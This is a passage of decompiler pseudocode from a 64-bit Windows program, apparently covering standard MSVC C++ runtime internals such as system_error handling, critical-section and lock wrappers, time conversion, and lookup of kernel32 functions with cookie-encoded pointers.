  a3[1].m128i_i64[0] = 0i64;
  a3[1].m128i_i64[1] = 15i64;
  a3->m128i_i8[0] = 0;
  a3[1].m128i_i64[0] = 0i64;
  a3[1].m128i_i64[1] = 15i64;
  a3->m128i_i8[0] = 0;
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F180808: using guessed type __int64 qword_13F180808[2];

//----- (000000013F109DF8) ----------------------------------------------------
void __fastcall sub_13F109DF8(int a1)
{
  if ( a1 > 0 )
  {
    if ( a1 <= 2 )
      sub_13F109E34(6);
    if ( a1 == 3 )
      sub_13F109E34(0);
    if ( a1 == 4 )
      sub_13F109E34(1);
  }
}

//----- (000000013F109E34) ----------------------------------------------------
void __fastcall __noreturn sub_13F109E34(int a1)
{
  __int64 v1; // rbx
  __int64 *v2; // rax
  __int64 pExceptionObject[7]; // [rsp+20h] [rbp-38h] BYREF

  v1 = a1;
  v2 = sub_13F109EE8();
  sub_13F109B94(pExceptionObject, dword_13F1806D0[v1], (__int64)v2, (const __m128i *)off_13F180698[v1]);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVsystem_error_std__);
}
// 13F180698: using guessed type char *off_13F180698[2];
// 13F1806D0: using guessed type int dword_13F1806D0[];
// 13F109E34: using guessed type _QWORD pExceptionObject[7];

//----- (000000013F109E7C) ----------------------------------------------------
__int64 __fastcall sub_13F109E7C(__int64 a1, __int64 a2, int a3)
{
  __int64 result; // rax

  *(_DWORD *)a2 = a3;
  result = a2;
  *(_QWORD *)(a2 + 8) = a1;
  return result;
}

//----- (000000013F109E88) ----------------------------------------------------
bool __fastcall sub_13F109E88(__int64 a1, __int64 a2, int a3)
{
  return *(_QWORD *)(a1 + 8) == *(_QWORD *)(*(_QWORD *)(a2 + 8) + 8i64) && *(_DWORD *)a2 == a3;
}

//----- (000000013F109EA4) ----------------------------------------------------
bool __fastcall sub_13F109EA4(__int64 a1, unsigned int a2, __int64 a3)
{
  __int64 v4; // rax
  char v6[24]; // [rsp+20h] [rbp-18h] BYREF

  v4 = (*(__int64 (__fastcall **)(__int64, char *, _QWORD))(*(_QWORD *)a1 + 24i64))(a1, v6, a2);
  return *(_QWORD *)(*(_QWORD *)(v4 + 8) + 8i64) == *(_QWORD *)(*(_QWORD *)(a3 + 8) + 8i64)
      && *(_DWORD *)v4 == *(_DWORD *)a3;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F109EA4: using guessed type char var_18[24];

//----- (000000013F109EE8) ----------------------------------------------------
__int64 *sub_13F109EE8()
{
  if ( !(unsigned int)sub_13F10A28C(
                        &qword_13F1C4210,
                        (unsigned int (__fastcall *)(volatile signed __int64 *, __int64, __int64))sub_13F1099D4,
                        (__int64)qword_13F1C4218) )
    sub_13F16A158();
  return qword_13F1C4218;
}
// 13F1C4210: using guessed type __int64 qword_13F1C4210;
// 13F1C4218: using guessed type __int64 qword_13F1C4218[2];

//----- (000000013F109F1C) ----------------------------------------------------
__m128i *__fastcall sub_13F109F1C(__int64 a1, __m128i *a2, int a3)
{
  const __m128i *v4; // rax

  v4 = (const __m128i *)sub_13F10A294(a3);
  a2[1].m128i_i64[0] = 0i64;
  a2[1].m128i_i64[1] = 15i64;
  a2->m128i_i8[0] = 0;
  sub_13F106C30(a2, v4);
  return a2;
}

//----- (000000013F109F54) ----------------------------------------------------
const char *sub_13F109F54()
{
  return "generic";
}

//----- (000000013F109F6C) ----------------------------------------------------
__int64 __fastcall sub_13F109F6C(_QWORD *a1)
{
  if ( _security_cookie != 0x2CC598517BDEi64 )
  {
    *a1 = off_13F1808A0;
    return ((__int64 (__fastcall *)(_QWORD *, uintptr_t))(_security_cookie ^ 0x2CC5986D15CEi64))(
             a1 + 1,
             _security_cookie);
  }
  else if ( _security_cookie != 0x2CC5986D15CEi64 )
  {
    *a1 = &Concurrency::details::stl_critical_section_vista::`vftable';
    return sub_13F10AB90();
  }
  else
  {
    *a1 = off_13F1808D0;
    return sub_13F14171C((__int64)(a1 + 1));
  }
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F180870: using guessed type void *Concurrency::details::stl_critical_section_vista::`vftable';
// 13F1808A0: using guessed type void *off_13F1808A0[6];
// 13F1808D0: using guessed type void *off_13F1808D0[5];
// 13F1C42F8: using guessed type __int64 qword_13F1C42F8;
// 13F1C4318: using guessed type __int64 qword_13F1C4318;
// 13F1C4328: using guessed type __int64 qword_13F1C4328;

//----- (000000013F109FE0) ----------------------------------------------------
void sub_13F109FE0()
{
  ;
}
// 13F1024B0: using guessed type __int64 __fastcall guard_check_icall_nop();

//----- (000000013F10A01C) ----------------------------------------------------
__int64 __fastcall sub_13F10A01C(__int64 a1, __m128i *a2)
{
  unsigned __int8 (__fastcall *v4)(__int64, _QWORD); // rbx
  unsigned int v5; // eax
  int v6; // ecx
  __int64 v8; // [rsp+20h] [rbp-38h] BYREF
  int v9; // [rsp+28h] [rbp-30h]

  if ( (*(_DWORD *)a1 & 0xFFFFFEFF) == 1 )
  {
    if ( *(_DWORD *)(a1 + 72) != (unsigned int)MEMORY[0x76F83380]() )
    {
      (**(void (__fastcall ***)(__int64))(a1 + 8))(a1 + 8);
      *(_DWORD *)(a1 + 72) = MEMORY[0x76F83380]();
    }
    ++*(_DWORD *)(a1 + 76);
    return 0i64;
  }
  if ( !a2 )
  {
    if ( *(_DWORD *)(a1 + 72) != (unsigned int)MEMORY[0x76F83380]() )
      (**(void (__fastcall ***)(__int64))(a1 + 8))(a1 + 8);
    goto LABEL_19;
  }
  if ( a2->m128i_i64[0] >= 0 && (a2->m128i_i64[0] || a2->m128i_i32[2] > 0) )
  {
    while ( 1 )
    {
      sub_13F10A3BC((__int64)&v8, 1u);
      if ( v8 >= a2->m128i_i64[0] && (v8 != a2->m128i_i64[0] || v9 >= a2->m128i_i32[2]) )
        goto LABEL_22;
      if ( *(_DWORD *)(a1 + 72) != (unsigned int)MEMORY[0x76F83380]() )
      {
        v4 = *(unsigned __int8 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)(a1 + 8) + 16i64);
        v5 = sub_13F10A2BC(a2, (__int64)&v8);
        if ( !v4(a1 + 8, v5) )
          continue;
      }
      goto LABEL_19;
    }
  }
  if ( *(_DWORD *)(a1 + 72) == (unsigned int)MEMORY[0x76F83380]()
    || (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 8) + 8i64))(a1 + 8) )
  {
LABEL_19:
    v6 = *(_DWORD *)(a1 + 76);
    *(_DWORD *)(a1 + 76) = v6 + 1;
    if ( v6 + 1 <= 1 )
    {
      *(_DWORD *)(a1 + 72) = MEMORY[0x76F83380]();
    }
    else if ( (*(_DWORD *)a1 & 0x100) == 0 )
    {
      *(_DWORD *)(a1 + 76) = v6;
      goto LABEL_22;
    }
    return 0i64;
  }
LABEL_22:
  if ( a2 && (a2->m128i_i64[0] || a2->m128i_i32[2]) )
    return 2i64;
  else
    return 3i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F10A188) ----------------------------------------------------
char __fastcall sub_13F10A188(__int64 a1)
{
  return sub_13F141E98(a1 + 8);
}

//----- (000000013F10A194) ----------------------------------------------------
bool __fastcall sub_13F10A194(__int64 a1)
{
  return (unsigned int)MEMORY[0x771B38C0](a1 + 8) != 0;
}

//----- (000000013F10A1AC) ----------------------------------------------------
bool __fastcall sub_13F10A1AC()
{
  return (unsigned __int8)sub_13F10AC68() != 0;
}

//----- (000000013F10A1C4) ----------------------------------------------------
char __fastcall sub_13F10A1C4(__int64 a1, int a2)
{
  return sub_13F141EF8(a1 + 8, a2);
}

//----- (000000013F10A1F4) ----------------------------------------------------
void __fastcall sub_13F10A1F4(__int64 a1)
{
  *(_DWORD *)(a1 + 72) = -1;
  --*(_DWORD *)(a1 + 76);
}

//----- (000000013F10A1FC) ----------------------------------------------------
__int64 __fastcall sub_13F10A1FC(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 8) + 32i64))(a1 + 8);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F10A210) ----------------------------------------------------
__int64 __fastcall sub_13F10A210(__int64 a1, int a2)
{
  __int64 result; // rax

  result = sub_13F109F6C((_QWORD *)(a1 + 8));
  *(_DWORD *)(a1 + 72) = -1;
  *(_DWORD *)(a1 + 76) = 0;
  *(_DWORD *)a1 = a2;
  return result;
}

//----- (000000013F10A240) ----------------------------------------------------
__int64 __fastcall sub_13F10A240(__int64 a1)
{
  return sub_13F10A01C(a1, 0i64);
}

//----- (000000013F10A248) ----------------------------------------------------
__int64 __fastcall sub_13F10A248(__int64 a1)
{
  __int64 result; // rax

  result = MEMORY[0x76F83380]();
  ++*(_DWORD *)(a1 + 76);
  *(_DWORD *)(a1 + 72) = result;
  return result;
}

//----- (000000013F10A264) ----------------------------------------------------
__int64 __fastcall sub_13F10A264(__int64 a1)
{
  if ( (*(_DWORD *)(a1 + 76))-- == 1 )
  {
    *(_DWORD *)(a1 + 72) = -1;
    (*(void (__fastcall **)(__int64))(*(_QWORD *)(a1 + 8) + 24i64))(a1 + 8);
  }
  return 0i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F10A28C) ----------------------------------------------------
__int64 __fastcall sub_13F10A28C(
        volatile signed __int64 *a1,
        unsigned int (__fastcall *a2)(volatile signed __int64 *, __int64, __int64),
        __int64 a3)
{
  return sub_13F10AAAC(a1, a2, a3, 0i64);
}

//----- (000000013F10A294) ----------------------------------------------------
const char *__fastcall sub_13F10A294(int a1)
{
  __int64 *v1; // rax

  v1 = qword_13F180B80;
  while ( *(_DWORD *)v1 != a1 )
  {
    v1 += 2;
    if ( v1 == (__int64 *)"address family not supported" )
      return "unknown error";
  }
  return (const char *)v1[1];
}
// 13F180B80: using guessed type __int64 qword_13F180B80[156];

//----- (000000013F10A2BC) ----------------------------------------------------
__int64 __fastcall sub_13F10A2BC(__m128i *a1, __int64 a2)
{
  __int64 v2; // r9
  int v3; // er8
  __int64 v4; // rcx
  __int64 v5; // rcx
  __int64 v6; // r9
  int v7; // er8
  __m128i v9; // [rsp+0h] [rbp-18h]
  int v10; // [rsp+0h] [rbp-18h]

  v9 = *a1;
  v2 = a1->m128i_i64[0];
  v3 = _mm_cvtsi128_si32(_mm_srli_si128(*a1, 8));
  if ( v3 < 0 )
  {
    v4 = (-1 - v3) / 0x3B9ACA00u + 1;
    v3 += 1000000000 * v4;
    v2 = v9.m128i_i64[0] - v4;
  }
  if ( v3 >= 1000000000 )
  {
    v5 = v3 / 0x3B9ACA00u;
    v3 %= 0x3B9ACA00u;
    v2 += v5;
  }
  if ( v3 >= *(_DWORD *)(a2 + 8) )
  {
    v6 = v2 - *(_QWORD *)a2;
    v7 = v3 - *(_DWORD *)(a2 + 8);
  }
  else
  {
    v6 = -1i64 - *(_QWORD *)a2 + v2;
    v7 = 1000000000 - *(_DWORD *)(a2 + 8) + v3;
  }
  v10 = v6;
  if ( v6 < 0 || !v6 && v7 <= 0 )
  {
    v10 = 0;
    v7 = 0;
  }
  return (unsigned int)(1000 * v10 + (v7 + 999999) / 1000000);
}

//----- (000000013F10A38C) ----------------------------------------------------
unsigned __int64 sub_13F10A38C()
{
  unsigned int v1; // [rsp+30h] [rbp+8h]
  unsigned int v2; // [rsp+34h] [rbp+Ch]

  sub_13F10AA60();
  return v1 + ((unsigned __int64)v2 << 32) - 116444736000000000i64;
}

//----- (000000013F10A3BC) ----------------------------------------------------
__int64 __fastcall sub_13F10A3BC(__int64 a1, unsigned int a2)
{
  unsigned int v2; // ebx
  unsigned __int64 v4; // rax

  v2 = a2;
  if ( a2 == 1 && a1 )
  {
    v4 = sub_13F10A38C();
    *(_QWORD *)a1 = v4 / 0x989680;
    *(_DWORD *)(a1 + 8) = 100 * (v4 % 0x989680);
  }
  else
  {
    return 0;
  }
  return v2;
}

//----- (000000013F10A414) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F10A414()
{
  __int64 v0; // rbx

  v0 = MEMORY[0x76F920C0](L"kernel32.dll");
  qword_13F1C4230 = _security_cookie ^ MEMORY[0x76F92020](v0, "FlsAlloc");
  qword_13F1C4238 = _security_cookie ^ MEMORY[0x76F92020](v0, "FlsFree");
  qword_13F1C4240 = _security_cookie ^ MEMORY[0x76F92020](v0, "FlsGetValue");
  qword_13F1C4248 = _security_cookie ^ MEMORY[0x76F92020](v0, "FlsSetValue");
  qword_13F1C4250 = _security_cookie ^ MEMORY[0x76F92020](v0, "InitializeCriticalSectionEx");
  qword_13F1C4258 = _security_cookie ^ MEMORY[0x76F92020](v0, "InitOnceExecuteOnce");
  qword_13F1C4260 = _security_cookie ^ MEMORY[0x76F92020](v0, "CreateEventExW");
  qword_13F1C4268 = _security_cookie ^ MEMORY[0x76F92020](v0, "CreateSemaphoreW");
  qword_13F1C4270 = _security_cookie ^ MEMORY[0x76F92020](v0, "CreateSemaphoreExW");
  qword_13F1C4278 = _security_cookie ^ MEMORY[0x76F92020](v0, "CreateThreadpoolTimer");
  qword_13F1C4280 = _security_cookie ^ MEMORY[0x76F92020](v0, "SetThreadpoolTimer");
  qword_13F1C4288 = _security_cookie ^ MEMORY[0x76F92020](v0, "WaitForThreadpoolTimerCallbacks");
  qword_13F1C4290 = _security_cookie ^ MEMORY[0x76F92020](v0, "CloseThreadpoolTimer");
  qword_13F1C4298 = _security_cookie ^ MEMORY[0x76F92020](v0, "CreateThreadpoolWait");
  qword_13F1C42A0 = _security_cookie ^ MEMORY[0x76F92020](v0, "SetThreadpoolWait");
  qword_13F1C42A8 = _security_cookie ^ MEMORY[0x76F92020](v0, "CloseThreadpoolWait");
  qword_13F1C42B0 = _security_cookie ^ MEMORY[0x76F92020](v0, "FlushProcessWriteBuffers");
  qword_13F1C42B8 = _security_cookie ^ MEMORY[0x76F92020](v0, "FreeLibraryWhenCallbackReturns");
  qword_13F1C42C0 = _security_cookie ^ MEMORY[0x76F92020](v0, "GetCurrentProcessorNumber");
  qword_13F1C42C8 = _security_cookie ^ MEMORY[0x76F92020](v0, "CreateSymbolicLinkW");
  qword_13F1C42D0 = _security_cookie ^ MEMORY[0x76F92020](v0, "GetCurrentPackageId");
  qword_13F1C42D8 = _security_cookie ^ MEMORY[0x76F92020](v0, "GetTickCount64");
  qword_13F1C42E0 = _security_cookie ^ MEMORY[0x76F92020](v0, "GetFileInformationByHandleEx");
  qword_13F1C42E8 = _security_cookie ^ MEMORY[0x76F92020](v0, "SetFileInformationByHandle");
  qword_13F1C42F0 = _security_cookie ^ MEMORY[0x76F92020](v0, "GetSystemTimePreciseAsFileTime");
  qword_13F1C42F8 = _security_cookie ^ MEMORY[0x76F92020](v0, "InitializeConditionVariable");
  qword_13F1C4300 = _security_cookie ^ MEMORY[0x76F92020](v0, "WakeConditionVariable");
  qword_13F1C4308 = _security_cookie ^ MEMORY[0x76F92020](v0, "WakeAllConditionVariable");
  qword_13F1C4310 = _security_cookie ^ MEMORY[0x76F92020](v0, "SleepConditionVariableCS");
  qword_13F1C4318 = _security_cookie ^ MEMORY[0x76F92020](v0, "InitializeSRWLock");
  qword_13F1C4320 = _security_cookie ^ MEMORY[0x76F92020](v0, "AcquireSRWLockExclusive");
  qword_13F1C4328 = _security_cookie ^ MEMORY[0x76F92020](v0, "TryAcquireSRWLockExclusive");
  qword_13F1C4330 = _security_cookie ^ MEMORY[0x76F92020](v0, "ReleaseSRWLockExclusive");
  qword_13F1C4338 = _security_cookie ^ MEMORY[0x76F92020](v0, "SleepConditionVariableSRW");
  qword_13F1C4340 = _security_cookie ^ MEMORY[0x76F92020](v0, "CreateThreadpoolWork");
  qword_13F1C4348 = _security_cookie ^ MEMORY[0x76F92020](v0, "SubmitThreadpoolWork");
  qword_13F1C4350 = _security_cookie ^ MEMORY[0x76F92020](v0, "CloseThreadpoolWork");
  qword_13F1C4358 = _security_cookie ^ MEMORY[0x76F92020](v0, "CompareStringEx");
  qword_13F1C4360 = _security_cookie ^ MEMORY[0x76F92020](v0, "GetLocaleInfoEx");
  qword_13F1C4368 = _security_cookie ^ MEMORY[0x76F92020](v0, "LCMapStringEx");
  return 0i64;
}
// 13F10A44B: write access to const memory at 13F1C4230 has been detected
// 13F10A469: write access to const memory at 13F1C4238 has been detected
// 13F10A487: write access to const memory at 13F1C4240 has been detected
// 13F10A4A5: write access to const memory at 13F1C4248 has been detected
// 13F10A4C3: write access to const memory at 13F1C4250 has been detected
// 13F10A4E1: write access to const memory at 13F1C4258 has been detected
// 13F10A4FF: write access to const memory at 13F1C4260 has been detected
// 13F10A51D: write access to const memory at 13F1C4268 has been detected
// 13F10A53B: write access to const memory at 13F1C4270 has been detected
// 13F10A559: write access to const memory at 13F1C4278 has been detected
// 13F10A577: write access to const memory at 13F1C4280 has been detected
// 13F10A595: write access to const memory at 13F1C4288 has been detected
// 13F10A5B3: write access to const memory at 13F1C4290 has been detected
// 13F10A5D1: write access to const memory at 13F1C4298 has been detected
// 13F10A5EF: write access to const memory at 13F1C42A0 has been detected
// 13F10A60D: write access to const memory at 13F1C42A8 has been detected
// 13F10A62B: write access to const memory at 13F1C42B0 has been detected
// 13F10A649: write access to const memory at 13F1C42B8 has been detected
// 13F10A667: write access to const memory at 13F1C42C0 has been detected
// 13F10A685: write access to const memory at 13F1C42C8 has been detected
// 13F10A6A3: write access to const memory at 13F1C42D0 has been detected
// 13F10A6C1: write access to const memory at 13F1C42D8 has been detected
// 13F10A6DF: write access to const memory at 13F1C42E0 has been detected
// 13F10A6FD: write access to const memory at 13F1C42E8 has been detected
// 13F10A71B: write access to const memory at 13F1C42F0 has been detected
// 13F10A739: write access to const memory at 13F1C42F8 has been detected
// 13F10A757: write access to const memory at 13F1C4300 has been detected
// 13F10A775: write access to const memory at 13F1C4308 has been detected
// 13F10A793: write access to const memory at 13F1C4310 has been detected
// 13F10A7B1: write access to const memory at 13F1C4318 has been detected
// 13F10A7CF: write access to const memory at 13F1C4320 has been detected
// 13F10A7EA: write access to const memory at 13F1C4328 has been detected
// 13F10A80B: write access to const memory at 13F1C4330 has been detected
// 13F10A829: write access to const memory at 13F1C4338 has been detected
// 13F10A847: write access to const memory at 13F1C4340 has been detected
// 13F10A865: write access to const memory at 13F1C4348 has been detected
// 13F10A883: write access to const memory at 13F1C4350 has been detected
// 13F10A8A1: write access to const memory at 13F1C4358 has been detected
// 13F10A8BF: write access to const memory at 13F1C4360 has been detected
// 13F10A8D3: write access to const memory at 13F1C4368 has been detected
// 13F10A414: using guessed type __int64 __fastcall sub_13F10A414();
// 13F181660: using guessed type wchar_t aKernel32Dll[13];
// 13F1C4230: using guessed type __int64 qword_13F1C4230;
// 13F1C4238: using guessed type __int64 qword_13F1C4238;
// 13F1C4240: using guessed type __int64 qword_13F1C4240;
// 13F1C4248: using guessed type __int64 qword_13F1C4248;
// 13F1C4250: using guessed type __int64 qword_13F1C4250;
// 13F1C4258: using guessed type __int64 qword_13F1C4258;
// 13F1C4260: using guessed type __int64 qword_13F1C4260;
// 13F1C4268: using guessed type __int64 qword_13F1C4268;
// 13F1C4270: using guessed type __int64 qword_13F1C4270;
// 13F1C4278: using guessed type __int64 qword_13F1C4278;
// 13F1C4280: using guessed type __int64 qword_13F1C4280;
// 13F1C4288: using guessed type __int64 qword_13F1C4288;
// 13F1C4290: using guessed type __int64 qword_13F1C4290;
// 13F1C4298: using guessed type __int64 qword_13F1C4298;
// 13F1C42A0: using guessed type __int64 qword_13F1C42A0;
// 13F1C42A8: using guessed type __int64 qword_13F1C42A8;
// 13F1C42B0: using guessed type __int64 qword_13F1C42B0;
// 13F1C42B8: using guessed type __int64 qword_13F1C42B8;
// 13F1C42C0: using guessed type __int64 qword_13F1C42C0;
// 13F1C42C8: using guessed type __int64 qword_13F1C42C8;
// 13F1C42D0: using guessed type __int64 qword_13F1C42D0;
// 13F1C42D8: using guessed type __int64 qword_13F1C42D8;
// 13F1C42E0: using guessed type __int64 qword_13F1C42E0;
// 13F1C42E8: using guessed type __int64 qword_13F1C42E8;
// 13F1C42F0: using guessed type __int64 qword_13F1C42F0;
// 13F1C42F8: using guessed type __int64 qword_13F1C42F8;
// 13F1C4300: using guessed type __int64 qword_13F1C4300;
// 13F1C4308: using guessed type __int64 qword_13F1C4308;
// 13F1C4310: using guessed type __int64 qword_13F1C4310;
// 13F1C4318: using guessed type __int64 qword_13F1C4318;
// 13F1C4320: using guessed type __int64 qword_13F1C4320;
// 13F1C4328: using guessed type __int64 qword_13F1C4328;
// 13F1C4330: using guessed type __int64 qword_13F1C4330;
// 13F1C4338: using guessed type __int64 qword_13F1C4338;
// 13F1C4340: using guessed type __int64 qword_13F1C4340;
// 13F1C4348: using guessed type __int64 qword_13F1C4348;
// 13F1C4350: using guessed type __int64 qword_13F1C4350;
// 13F1C4358: using guessed type __int64 qword_13F1C4358;
// 13F1C4360: using guessed type __int64 qword_13F1C4360;
// 13F1C4368: using guessed type __int64 qword_13F1C4368;

//----- (000000013F10A8FC) ----------------------------------------------------
__int64 (*sub_13F10A8FC())(void)
{
  __int64 (*result)(void); // rax

  result = (__int64 (*)(void))(_security_cookie ^ 0x2CC59868999Ei64);
  if ( _security_cookie != 0x2CC59868999Ei64 )
    return (__int64 (*)(void))result();
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C4290: using guessed type __int64 qword_13F1C4290;

//----- (000000013F10A91C) ----------------------------------------------------
__int64 (*sub_13F10A91C())(void)
{
  __int64 (*result)(void); // rax

  result = (__int64 (*)(void))(_security_cookie ^ 0x2CC59868E94Ei64);
  if ( _security_cookie != 0x2CC59868E94Ei64 )
    return (__int64 (*)(void))result();
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C42A8: using guessed type __int64 qword_13F1C42A8;

//----- (000000013F10A93C) ----------------------------------------------------
__int64 sub_13F10A93C()
{
  if ( _security_cookie == 0x2CC5998A9EEEi64 )
    JUMPOUT(0x76F84730i64);
  return ((__int64 (*)(void))(_security_cookie ^ 0x2CC5998A9EEEi64))();
}
// 13F10A970: control flows out of bounds to 76F84730
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C4260: using guessed type __int64 qword_13F1C4260;

//----- (000000013F10A978) ----------------------------------------------------
__int64 __fastcall sub_13F10A978(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6)
{
  if ( _security_cookie != 0x2CC5998A9DBEi64 )
    return ((__int64 (__fastcall *)(__int64, __int64, __int64, __int64, int, int))(_security_cookie ^ 0x2CC5998A9DBEi64))(
             a1,
             a2,
             a3,
             a4,
             a5,
             a6);
  if ( _security_cookie != 0x2CC59986DACEi64 )
    return ((__int64 (*)(void))(_security_cookie ^ 0x2CC59986DACEi64))();
  return 0i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C4268: using guessed type __int64 qword_13F1C4268;
// 13F1C4270: using guessed type __int64 qword_13F1C4270;

//----- (000000013F10A9CC) ----------------------------------------------------
__int64 sub_13F10A9CC()
{
  if ( _security_cookie != 0x2CC599862A7Ei64 )
    return ((__int64 (*)(void))(_security_cookie ^ 0x2CC599862A7Ei64))();
  else
    return 0i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C4278: using guessed type __int64 qword_13F1C4278;

//----- (000000013F10A9E8) ----------------------------------------------------
__int64 sub_13F10A9E8()
{
  if ( _security_cookie != 0x2CC5998AEBFEi64 )
    return ((__int64 (*)(void))(_security_cookie ^ 0x2CC5998AEBFEi64))();
  else
    return 0i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C4298: using guessed type __int64 qword_13F1C4298;

//----- (000000013F10AA04) ----------------------------------------------------
__int64 (*sub_13F10AA04())(void)
{
  __int64 (*result)(void); // rax

  result = (__int64 (*)(void))(_security_cookie ^ 0x2CC5986C937Ei64);
  if ( _security_cookie != 0x2CC5986C937Ei64 )
    return (__int64 (*)(void))result();
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C42B0: using guessed type __int64 qword_13F1C42B0;

//----- (000000013F10AA24) ----------------------------------------------------
__int64 (*sub_13F10AA24())(void)
{
  __int64 (*result)(void); // rax

  result = (__int64 (*)(void))(_security_cookie ^ 0x2CC59854C6FEi64);
  if ( _security_cookie != 0x2CC59854C6FEi64 )
    return (__int64 (*)(void))result();
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C42B8: using guessed type __int64 qword_13F1C42B8;

//----- (000000013F10AA44) ----------------------------------------------------
__int64 sub_13F10AA44()
{
  if ( _security_cookie != 0x2CC5986CFDCEi64 )
    return ((__int64 (*)(void))(_security_cookie ^ 0x2CC5986CFDCEi64))();
  else
    return 0i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C42C0: using guessed type __int64 qword_13F1C42C0;

//----- (000000013F10AA60) ----------------------------------------------------
__int64 sub_13F10AA60()
{
  if ( _security_cookie == 0x2CC5EF7154DEi64 )
    JUMPOUT(0x76F833E0i64);
  return ((__int64 (*)(void))(_security_cookie ^ 0x2CC5EF7154DEi64))();
}
// 13F10AA77: control flows out of bounds to 76F833E0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C42F0: using guessed type __int64 qword_13F1C42F0;

//----- (000000013F10AA80) ----------------------------------------------------
__int64 sub_13F10AA80()
{
  if ( _security_cookie != 0x2CC59986DE0Ei64 )
    return ((__int64 (*)(void))(_security_cookie ^ 0x2CC59986DE0Ei64))();
  else
    return (unsigned int)MEMORY[0x76F914B0]();
}
// 13F10AA80: using guessed type __int64 __fastcall sub_13F10AA80();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C42D8: using guessed type __int64 qword_13F1C42D8;

//----- (000000013F10AAAC) ----------------------------------------------------
__int64 __fastcall sub_13F10AAAC(
        volatile signed __int64 *a1,
        unsigned int (__fastcall *a2)(volatile signed __int64 *, __int64, __int64),
        __int64 a3,
        __int64 a4)
{
  signed __int64 v9; // rax
  __int64 v10; // rdi
  unsigned int v11; // esi

  if ( _security_cookie != 0x2CC5998609AEi64 )
    return ((__int64 (*)(void))(_security_cookie ^ 0x2CC5998609AEi64))();
  v9 = _InterlockedCompareExchange64(a1, 1i64, 0i64);
  v10 = 2i64;
  while ( 1 )
  {
    if ( v9 == 2 )
      return 1i64;
    if ( !v9 )
      break;
    if ( v9 != 1 )
      goto LABEL_13;
    MEMORY[0x76F7AB70]();
    v9 = _InterlockedCompareExchange64(a1, 1i64, 0i64);
  }
  v11 = 1;
  if ( !a2(a1, a3, a4) )
  {
    v10 = 0i64;
    v11 = 0;
  }
  if ( _InterlockedExchange64(a1, v10) == 1 )
    return v11;
LABEL_13:
  MEMORY[0x76F91780](13i64);
  return 0i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C4258: using guessed type __int64 qword_13F1C4258;

//----- (000000013F10AB90) ----------------------------------------------------
__int64 sub_13F10AB90()
{
  if ( _security_cookie != 0x2CC599893A8Ei64 )
    return ((__int64 (*)(void))(_security_cookie ^ 0x2CC599893A8Ei64))();
  MEMORY[0x76F85980]();
  return 1i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C4250: using guessed type __int64 qword_13F1C4250;

//----- (000000013F10ABF0) ----------------------------------------------------
__int64 (*sub_13F10ABF0())(void)
{
  __int64 (*result)(void); // rax

  result = (__int64 (*)(void))(_security_cookie ^ 0x2CC5986BF2DEi64);
  if ( _security_cookie != 0x2CC5986BF2DEi64 )
    return (__int64 (*)(void))result();
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C4280: using guessed type __int64 qword_13F1C4280;

//----- (000000013F10AC10) ----------------------------------------------------
__int64 (*sub_13F10AC10())(void)
{
  __int64 (*result)(void); // rax

  result = (__int64 (*)(void))(_security_cookie ^ 0x2CC5986B86DEi64);
  if ( _security_cookie != 0x2CC5986B86DEi64 )
    return (__int64 (*)(void))result();
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C42A0: using guessed type __int64 qword_13F1C42A0;

//----- (000000013F10AC30) ----------------------------------------------------
__int64 sub_13F10AC30()
{
  return ((__int64 (*)(void))(_security_cookie ^ 0x2CC5998AE20Ei64))();
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C4310: using guessed type __int64 qword_13F1C4310;

//----- (000000013F10AC48) ----------------------------------------------------
__int64 sub_13F10AC48()
{
  return ((__int64 (*)(void))(_security_cookie ^ 0x2CC5998AE25Ei64))();
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C4338: using guessed type __int64 qword_13F1C4338;

//----- (000000013F10AC68) ----------------------------------------------------
